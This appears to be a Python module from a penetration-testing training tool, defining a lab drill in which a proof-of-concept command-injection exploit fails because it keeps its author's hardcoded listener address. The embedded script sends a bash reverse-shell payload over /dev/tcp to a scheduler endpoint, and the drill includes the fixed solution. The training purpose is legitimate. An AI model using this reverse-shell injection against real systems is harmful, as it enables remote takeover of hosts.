"""salvage defect class 2: what the script assumes about *you*.

Public proof-of-concept code is written against the author's own lab and
carries their addresses in it. The habit this trains is reading a script for
its assumptions about your side of the connection, not only about the target.

**Nothing here ever connects outward (crux D2).** The stale address in this
script is a string inside a payload, never a destination: the script talks
only to the loopback target crux opened. A drill that made a real connection
to `192.168.1.50` to teach you about hardcoded addresses would be reaching
onto somebody's actual network to make its point.
"""

from __future__ import annotations

from ...model import SalvageBody, Scenario
from ...targets._hits import Requirement

BROKEN = r'''#!/usr/bin/env python3
# Wexler CMS 2.0 - job scheduler command injection
# Drops a callback. Start your listener first.
import urllib.parse
import urllib.request
import urllib.error

TARGET = "{{URL}}"

# my box
LHOST = "192.168.1.50"
LPORT = "9001"

def main():
    cb = LHOST + ":" + LPORT
    payload = "bash -i >& /dev/tcp/" + LHOST + "/" + LPORT + " 0>&1"
    print("[*] callback set to " + cb)
    data = urllib.parse.urlencode({"job": "nightly", "cb": cb,
                                   "cmd": payload}).encode()
    req = urllib.request.Request(TARGET + "/admin/schedule", data)
    try:
        body = urllib.request.urlopen(req, timeout=5).read().decode()
    except urllib.error.HTTPError as e:
        body = e.read().decode()
    print("[*] response: " + body)
    print("[+] landed" if "CRUX-LANDED" in body else "[-] no")

if __name__ == "__main__":
    main()
'''

SOLUTION = BROKEN.replace('LHOST = "192.168.1.50"', 'LHOST = "127.0.0.1"') \
                 .replace('LPORT = "9001"', 'LPORT = "4444"')

SCENARIOS = [
    Scenario(
        id='salvage-address', track='salvage', tier='verified', order=20,
        title='It runs cleanly and nothing happens',
        waypoint='shell-callback', hone=('python',),
        source='PEN-200 Playbook/04 - Phase 4 - Initial Foothold (Web).md',
        body=SalvageBody(
            brief='The scheduler endpoint on Wexler CMS runs what it is '
                  'given. This proof-of-concept is valid Python 3 and exits '
                  'without an error, which is the problem. **Your listener is '
                  'on `127.0.0.1:4444`.**',
            filename='wexler_schedule.py',
            cve='CVE-2019-15107', models='Webmin',
            real_note=(
                "Webmin reverse-shell PoCs hardcode the author's LHOST and "
                'LPORT in the payload. Run one unedited and the shell is '
                'offered to a machine that stopped being theirs years ago.'
            ),
            defects=('hardcoded LHOST from the author lab',
                     'hardcoded LPORT'),
            route='/admin/schedule',
            reject_code=200,
            reject_message='job accepted',
            broken=BROKEN, solution=SOLUTION,
            requirements=(
                Requirement('the schedule endpoint', 'route',
                            '/admin/schedule',
                            hint='nothing arrived at /admin/schedule'),
                Requirement('a callback address', 'form', '127.0.0.1:4444',
                            key='cb',
                            hint='the callback still points at the address '
                                 'the original author used, not at yours'),
                Requirement('a payload that calls back to you', 'form',
                            '/dev/tcp/127.0.0.1/4444', key='cmd',
                            hint='the payload itself still carries the '
                                 'original author address'),
            ),
            debrief='**It exited zero and printed a success line.** The '
                    'request was well formed, the endpoint accepted it, and '
                    'the shell was offered to a machine on somebody else '
                    'network four years ago. Read a proof-of-concept for what '
                    'it assumes about *your* side before you run it: `LHOST`, '
                    '`LPORT`, an interface name, a path on the attacker box, '
                    'a wordlist location. And note that the address appeared '
                    'twice: fixing the variable is not the same as fixing '
                    'every use of it.',
        ),
    ),
]
